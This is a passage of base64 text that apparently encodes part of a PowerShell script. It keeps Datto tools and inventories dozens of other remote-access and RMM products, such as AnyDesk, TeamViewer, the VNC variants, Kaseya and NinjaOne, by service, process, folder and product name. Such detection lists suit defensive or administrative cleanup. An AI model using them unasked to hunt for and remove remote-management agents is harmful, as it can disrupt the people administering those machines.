biBJcy1EYXR0b0tlZXBlcihbc3RyaW5nXSRzKSB7CiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0
dXJuICRmYWxzZSB9CiAgICAgICAgcmV0dXJuIFtib29sXSgkcyAtbWF0Y2ggJyg/aSlEYXR0b3xD
ZW50cmFTdGFnZXxDYWdTZXJ2aWNlfEF1dG90YXNrRW5kcG9pbnQnKQogICAgfQogICAgJHJtbSA9
IEAoCiAgICAgICAgQHsgVGFnPSdBbnlEZXNrJzsgICAgICBTdmM9QCgnQW55RGVzaycpOyBQcm9j
PUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2siLCIkZW52OlByb2dyYW1EYXRhXEFueURlc2siKTsg
UHJvZD1AKCdBbnlEZXNrKicpIH0KICAgICAgICBAeyBUYWc9J1RlYW1WaWV3ZXInOyAgIFN2Yz1A
KCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1RlYW1WaWV3ZXIqJywndHZfdzMyKicsJ3R2X3g2NCon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1AKCdUZWFtVmlld2VyKicpIH0KICAgICAgICBA
eyBUYWc9J1NwbGFzaHRvcCc7ICAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NV
U2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdTcGxhc2h0b3AqJykgfQogICAgICAgIEB7IFRh
Zz0nTG9nTWVJbic7ICAgICAgU3ZjPUAoJ0xvZ01lSW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWln
bml0aW9uJyk7IFByb2M9QCgnTG9nTWVJbionLCdMTUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMb2dNZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dNZUluKicpIH0KICAgICAgICBAeyBUYWc9J0dvVG8n
OyAgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicp
OyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1Rv
IFJlc29sdmUqJywnR29Ub01lZXRpbmcqJywnR29UbyBDb25uZWN0KicpIH0KICAgICAgICBAeyBU
YWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0RGVzaycsJ3J1c3RkZXNrKicpOyBQcm9jPUAo
J3J1c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNrIik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQogICAg
ICAgIEB7IFRhZz0nU3VwcmVtbyc7ICAgICAgU3ZjPUAoJ1N1cHJlbW8qJyk7IFByb2M9QCgnU3Vw
cmVtbyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXByZW1vIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XFN1cHJlbW8iKTsgUHJvZD1AKCdTdXByZW1vKicpIH0KICAgICAgICBAeyBU
YWc9J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdk
d2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9k
PUAoJ0RXQWdlbnQqJywnRFdTZXJ2aWNlKicpIH0KICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3Qn
OyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9NZWV0aW5nKicpOyBQcm9jPUAoJ1pvaG9Bc3Np
c3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmci
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cWm9ob01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFz
c2lzdConLCdab2hvTWVldGluZyonKSB9CiAgICAgICAgQHsgVGFnPSdSZW1vdGVQQyc7ICAgICBT
dmM9QCgnUmVtb3RlUEMqJyk7IFByb2M9QCgnUmVtb3RlUEMqJywnUlBDU3VpdGUqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVtb3RlUEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
UmVtb3RlUEMiKTsgUHJvZD1AKCdSZW1vdGVQQyonKSB9CiAgICAgICAgQHsgVGFnPSdCb21nYXIn
OyAgICAgICBTdmM9QCgnYm9tZ2FyKicsJ0JleW9uZFRydXN0KicpOyBQcm9jPUAoJ2JvbWdhcion
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCb21nYXIiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFtRmlsZXNcQmV5b25kVHJ1c3QiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cQmV5b25kVHJ1c3QiKTsgUHJvZD1AKCdCb21nYXIqJywnQmV5b25kVHJ1
c3QqJykgfQogICAgICAgIEB7IFRhZz0nUGFyc2VjJzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsg
UHJvYz1AKCdwYXJzZWNkKicsJ3BzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XFBhcnNlYyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1E
YXRhXFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyonKSB9CiAgICAgICAgQHsgVGFnPSdDaHJvbWVS
RCc7ICAgICBTdmM9QCgnY2hyb21vdGluZyonKTsgUHJvYz1AKCdyZW1vdGluZ19ob3N0KicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR29vZ2xlXENocm9tZSBSZW1vdGUgRGVza3RvcCIpOyBQ
cm9kPUAoJ0Nocm9tZSBSZW1vdGUgRGVza3RvcConKSB9CiAgICAgICAgQHsgVGFnPSdVbHRyYVZO
Qyc7ICAgICBTdmM9QCgndXZuYyonLCd3aW52bmMqJyk7IFByb2M9QCgnd2ludm5jKicsJ3V2bmMq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVWx0cmFWTkMiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cVWx0cmFWTkMiKTsgUHJvZD1AKCdVbHRyYVZOQyonLCdXaW5WTkMqJykgfQogICAg
ICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAgICAgU3ZjPUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0
dm5zZXJ2ZXIqJywndHZudmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0
Vk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGlnaHRW
TkMqJykgfQogICAgICAgIEB7IFRhZz0nUmVhbFZOQyc7ICAgICAgU3ZjPUAoJ3ZuY3NlcnZlcion
KTsgUHJvYz1AKCd2bmNzZXJ2ZXIqJywndm5jdmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXFJlYWxWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVhbFZOQyIpOyBQcm9k
PUAoJ1ZOQyBTZXJ2ZXIqJywnUmVhbFZOQyonKSB9CiAgICAgICAgQHsgVGFnPSdEYW1lV2FyZSc7
ICAgICBTdmM9QCgnRGFtZVdhcmUqJyk7IFByb2M9QCgnRFdSQ1MqJywnRFdSQ0MqJywnRGFtZVdh
cmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU29sYXJXaW5kcyIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxTb2xhcldpbmRzIiwiJGVudjpQcm9ncmFtRmlsZXNcRGFtZVdhcmUgUmVt
b3RlIFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRGFtZVdhcmUgUmVtb3RlIFN1
cHBvcnQiKTsgUHJvZD1AKCdEYW1lV2FyZSonKSB9CiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0
JzsgICBTdmM9QCgnTmV0U3VwcG9ydConKTsgUHJvYz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0U3VwcG9ydCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgnTmV0U3VwcG9ydConKSB9CiAgICAgICAgQHsg
VGFnPSdTaW1wbGVIZWxwJzsgICBTdmM9QCgnU2ltcGxlSGVscConKTsgUHJvYz1AKCdTaW1wbGVT
ZXJ2aWNlKicsJ3NpbXBsZXNlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU2lt
cGxlSGVscCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTaW1wbGVIZWxwIik7IFByb2Q9QCgn
U2ltcGxlSGVscConKSB9CiAgICAgICAgQHsgVGFnPSdHZXRTY3JlZW4nOyAgICBTdmM9QCgnR2V0
U2NyZWVuKicpOyBQcm9jPUAoJ0dldFNjcmVlbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xHZXRTY3JlZW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR2V0U2NyZWVuIik7IFByb2Q9
QCgnR2V0U2NyZWVuKicpIH0KICAgICAgICBAeyBUYWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJ
cGVyaXVzKicpOyBQcm9jPUAoJ0lwZXJpdXNSZW1vdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
RmlsZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSXBlcml1cyBS
ZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0KICAgICAgICBAeyBUYWc9J0lTTE9ubGluZSc7
ICAgU3ZjPUAoJ0lTTGxpZ2h0KicpOyBQcm9jPUAoJ0lTTGxpZ2h0KicsJ0lTTEFsd2F5c09uKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElTTCBPbmxpbmUiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cSVNMIE9ubGluZSIpOyBQcm9kPUAoJ0lTTCBMaWdodConLCdJU0wgQWx3YXlzT24q
JykgfQogICAgICAgIEB7IFRhZz0nQW1teXknOyAgICAgICAgU3ZjPUAoJ0FtbXl5KicpOyBQcm9j
PUAoJ0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFtbXl5IiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEFtbXl5Iik7IFByb2Q9QCgnQW1teXkqJykgfQogICAgICAgIEB7IFRh
Zz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAoJ1VsdHJhVmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmll
d2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFVsdHJhVmlld2VyIik7IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykgfQog
ICAgICAgIEB7IFRhZz0nQWVyb0FkbWluJzsgICAgU3ZjPUAoJ0Flcm9BZG1pbionKTsgUHJvYz1A
KCdBZXJvQWRtaW4qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWVyb0FkbWluIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFlcm9BZG1pbiIpOyBQcm9kPUAoJ0Flcm9BZG1pbionKSB9
CiAgICAgICAgQHsgVGFnPSdMaXRlTWFuYWdlcic7ICBTdmM9QCgnTGl0ZU1hbmFnZXIqJyk7IFBy
b2M9QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xMaXRlTWFuYWdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMaXRlTWFuYWdlciIpOyBQ
cm9kPUAoJ0xpdGVNYW5hZ2VyKicpIH0KICAgICAgICBAeyBUYWc9J1JhZG1pbic7ICAgICAgIFN2
Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNlcnZlcjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRl
bnY6UHJvZ3JhbUZpbGVzXFJhZG1pbiBTZXJ2ZXIgMyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxSYWRtaW4gU2VydmVyIDMiKTsgUHJvZD1AKCdSYWRtaW4qJykgfQogICAgICAgIEB7IFRhZz0n
Tm9NYWNoaW5lJzsgICAgU3ZjPUAoJ254c2VydmVyKicsJ254ZConKTsgUHJvYz1AKCdueGQqJywn
bnhzZXJ2ZXIqJywnbnhydW5uZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTm9NYWNo
aW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5vTWFjaGluZSIpOyBQcm9kPUAoJ05vTWFj
aGluZSonKSB9CiAgICAgICAgQHsgVGFnPSdOaW5qYU9uZSc7ICAgICBTdmM9QCgnTmluamFSTU1B
Z2VudCcsJ25pbmphcm1tKicsJ05pbmphUk1NKicpOyBQcm9jPUAoJ05pbmphUk1NQWdlbnQqJywn
bmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmluamFSTU1BZ2VudCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxO
aW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTmluamFPbmUiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cTmluamFPbmUiKTsgUHJvZD1AKCdOaW5qYVJNTSonLCdOaW5qYU9uZSonKSB9
CiAgICAgICAgQHsgVGFnPSdBdGVyYSc7ICAgICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9j
PUAoJ0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQVRFUkEgTmV0d29y
a3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQVRFUkEgTmV0d29ya3MiLCIkZW52OlByb2dy
YW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgnQXRlcmEqJykgfQogICAgICAgIEB7IFRh
Zz0nQ29ubmVjdFdpc2UnOyAgU3ZjPUAoJ0xUU2VydmljZScsJ0xUU3ZjTW9uJyk7IFByb2M9QCgn
TFRTdmMqJywnTFRUcmF5KicpOyBEaXJzPUAoIiRlbnY6d2luZGlyXExUU3ZjIiwiJGVudjpQcm9n
cmFtRmlsZXNcTGFiVGVjaCBDbGllbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGFiVGVj
aCBDbGllbnQiKTsgUHJvZD1AKCdDb25uZWN0V2lzZSBBdXRvbWF0ZSonLCdDb25uZWN0V2lzZSBS
TU0qJywnTGFiVGVjaConKSB9CiAgICAgICAgQHsgVGFnPSdLYXNleWEnOyAgICAgICBTdmM9QCgn
QWdlbnRNb24nLCdLYXNleWEqJywnS0FBRFMqJyk7IFByb2M9QCgnQWdlbnRNb24qJywnS2FzZXlh
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEthc2V5YSIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdLYXNleWEgVlNBKicsJ0thc2V5YSBBZ2VudConKSB9
CiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAgICBTdmM9QCgnQWR2YW5jZWQgTW9uaXRvcmlu
ZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRyYWwqJyk7IFByb2M9QCgnRmlsZVN5c3RlbUFnZW50
KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0
b3JpbmcgQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmlu
ZyBBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE4tYWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hub2xvZ2llcyIsIiRlbnY6UHJvZ3JhbUZpbGVz
XE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTVNQQSBGaWxlcyIpOyBQcm9k
PUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ04tY2VudHJhbConLCdO
LXNpZ2h0KicsJ1Rha2UgQ29udHJvbConLCdTb2xhcldpbmRzIE1TUConKSB9CiAgICAgICAgQHsg
VGFnPSdTeW5jcm8nOyAgICAgICBTdmM9QCgnU3luY3JvKicsJ0thYnV0byonKTsgUHJvYz1AKCdT
eW5jcm8qJywnS2FidXRvKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlcGFpclRlY2gi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVwYWlyVGVjaCIsIiRlbnY6UHJvZ3JhbUZpbGVz
XFN5bmNybyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTeW5jcm8iLCIkZW52OlByb2dyYW1E
YXRhXFN5bmNybyIpOyBQcm9kPUAoJ1N5bmNybyonLCdLYWJ1dG8qJywnUmVwYWlyVGVjaConKSB9
CiAgICAgICAgQHsgVGFnPSdQdWxzZXdheSc7ICAgICBTdmM9QCgnUHVsc2V3YXkqJywnUEMgTW9u
aXRvcionKTsgUHJvYz1AKCdQQ01vbml0b3JNZ3IqJywnUENNb25pdG9yTWFuYWdlcionLCdQdWxz
ZXdheSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xQdWxzZXdheSIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxQdWxzZXdheSIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBDIE1vbml0b3IiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUEMgTW9uaXRvciIpOyBQcm9kPUAoJ1B1bHNld2F5Kics
J1BDIE1vbml0b3IqJykgfQogICAgICAgIEB7IFRhZz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1
cGVyT3BzKicpOyBQcm9jPUAoJ1N1cGVyT3BzKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cGVyT3BzIiwiJGVudjpQcm9n
cmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1cGVyT3BzKicpIH0KICAgICAgICBAeyBUYWc9
J0xldmVsJzsgICAgICAgIFN2Yz1AKCdMZXZlbConKTsgUHJvYz1AKCdsZXZlbConKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZl
bCIsIiRlbnY6UHJvZ3JhbURhdGFcTGV2ZWwiKTsgUHJvZD1AKCdMZXZlbConKSB9CiAgICAgICAg
QHsgVGFnPSdBY3Rpb24xJzsgICAgICBTdmM9QCgnQWN0aW9uMSonKTsgUHJvYz1AKCdBY3Rpb24x
KicsJ2FjdGlvbjFfYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWN0aW9uMSIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Rpb24xIiwiJGVudjpQcm9ncmFtRGF0YVxBY3Rp
b24xIik7IFByb2Q9QCgnQWN0aW9uMSonKSB9CiAgICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUn
OyBTdmM9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5h
Z2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNYW5hZ2VFbmdpbmUiKTsg
UHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyonLCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9p
bnQgQ2VudHJhbConLCdSTU0gQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdUYWN0aWNhbFJN
TSc7ICBTdmM9QCgndGFjdGljYWxybW0qJywnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcpOyBQcm9j
PUAoJ3RhY3RpY2Fscm1tKicsJ21lc2hhZ2VudConLCdNZXNoQWdlbnQqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcVGFjdGljYWxBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxU
YWN0aWNhbEFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9QCgnVGFjdGljYWwqJywnTWVzaCBBZ2Vu
dConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdNZXNoQ2VudHJhbCc7ICBTdmM9
QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hB
Z2VudConLCdNZXNoQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFn
ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNo
KkFnZW50KicsJ01lc2hDZW50cmFsKicpIH0KICAgICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAg
IFN2Yz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgUHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTQUFaT0QiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmlsZXNcQ29udGludXVtIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9kPUAoJ0NvbnRpbnV1bSonLCdTQUFaKicpIH0K
ICAgICAgICBAeyBUYWc9J05hdmVyaXNrJzsgICAgIFN2Yz1AKCdOYXZlcmlzayonKTsgUHJvYz1A
KCdOYXZlcmlzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOYXZlcmlzayIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxOYXZlcmlzayIpOyBQcm9kPUAoJ05hdmVyaXNrKicpIH0KICAg
ICAgICBAeyBUYWc9J0ltbXlCb3QnOyAgICAgIFN2Yz1AKCdJbW15Qm90KicsJ0ltbXkqJyk7IFBy
b2M9QCgnSW1teUFnZW50KicsJ0ltbXlCb3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
SW1teUJvdCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJbW15Qm90IiwiJGVudjpQcm9ncmFt
RGF0YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1teUJvdConKSB9CiAgICAgICAgQHsgVGFnPSdBdXRv
bW94JzsgICAgICBTdmM9QCgnYW1hZ2VudConLCdBdXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV0b21veCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFtRGF0YVxhbWFnZW50Iik7IFByb2Q9QCgnQXV0
b21veConKSB9CiAgICAgICAgQHsgVGFnPSdBY3JvbmlzQ3liZXInOyBTdmM9QCgnQWNyb25pcyon
KTsgUHJvYz1AKCdhY3JvY21kKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFjcm9uaXMi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWNyb25pcyIpOyBQcm9kPUAoJ0Fjcm9uaXMgQ3li
ZXIqJywnQWNyb25pcyBBZ2VudConLCdDeWJlciBQcm90ZWN0IEFnZW50KicpIH0KICAgICAgICBA
eyBUYWc9J0RvbW90eic7ICAgICAgIFN2Yz1AKCdEb21vdHoqJyk7IFByb2M9QCgnRG9tb3R6Kicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERvbW90eiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxEb21vdHoiKTsgUHJvZD1AKCdEb21vdHoqJykgfQogICAgICAgIEB7IFRhZz0nQXV2aWsn
OyAgICAgICAgU3ZjPUAoJ0F1dmlrKicpOyBQcm9jPUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dmlrIik7IFBy
b2Q9QCgnQXV2aWsqJykgfQogICAgICAgIEB7IFRhZz0nQmFycmFjdWRhUk1NJzsgU3ZjPUAoJ0Jh
cnJhY3VkYSonKTsgUHJvYz1AKCdNV1NlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcQmFycmFjdWRhIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJhcnJhY3VkYSIsIiRlbnY6
UHJvZ3JhbUZpbGVzXExldmVsIFBsYXRmb3JtcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxM
ZXZlbCBQbGF0Zm9ybXMiKTsgUHJvZD1AKCdCYXJyYWN1ZGEgUk1NKicsJ01hbmFnZWQgV29ya3Bs
YWNlKicpIH0KICAgICAgICBAeyBUYWc9J0dvdmVybGFuJzsgICAgIFN2Yz1AKCdHb3Zlcmxhbion
KTsgUHJvYz1AKCdnb3ZlcmxhbionLCdnb3ZhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb3ZlcmxhbiIpOyBQcm9k
PUAoJ0dvdmVybGFuKicpIH0KICAgICAgICBAeyBUYWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQ
RFEqJyk7IFByb2M9QCgnUERRUnVubmVyKicsJ1BEUUludmVudG9yeSonLCdQRFFEZXBsb3kqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRtaW4gQXJzZW5hbCIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVudjpQcm9ncmFtRmlsZXNcUERRIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQcm9kPUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVu
dG9yeSonLCdQRFEgQ29ubmVjdConKSB9CiAgICApCgogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJt
bSkgewogICAgICAgICRoaXQgPSAkZmFsc2UKICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29s
